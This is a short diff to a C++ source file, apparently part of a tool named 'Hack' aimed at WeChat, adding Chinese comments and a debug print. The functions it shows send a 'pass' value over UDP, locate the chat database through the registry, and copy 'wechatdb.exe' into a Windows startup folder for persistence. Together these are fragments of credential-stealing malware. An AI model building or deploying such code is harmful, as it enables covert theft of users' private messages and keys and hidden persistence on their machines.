@@ -1,7 +1,8 @@
 using namespace std;
 #include "Hack.h"
 
-int client(unsigned char *pass)
+//udp传输客户端函数
+int client(unsigned char *pass)                        
 {
 	WORD wVersion = MAKEWORD(2, 2);
 	WSADATA wsaData;
@@ -63,6 +64,7 @@ int client(unsigned char *pass)
 	return 0;
 }
 
+//通过注册表获取数据库文件目录
 void getPath(unsigned char *dbpath)
 {
 	char cmd_command[256] = { 0 };
@@ -82,7 +84,7 @@ void getPath(unsigned char *dbpath)
 	}
 }
 
-
+//添加开机自启
 int winStartUp()
 {
 	unsigned char value[256] = { 0 };
@@ -102,6 +104,7 @@ int winStartUp()
 		return 0;
 	}
 	sprintf_s(cmd_command, "copy wechatdb.exe \"%s\" /B", value);
+	printf("%s\n",cmd_command);
 	system(cmd_command);
 	return 0;
 }
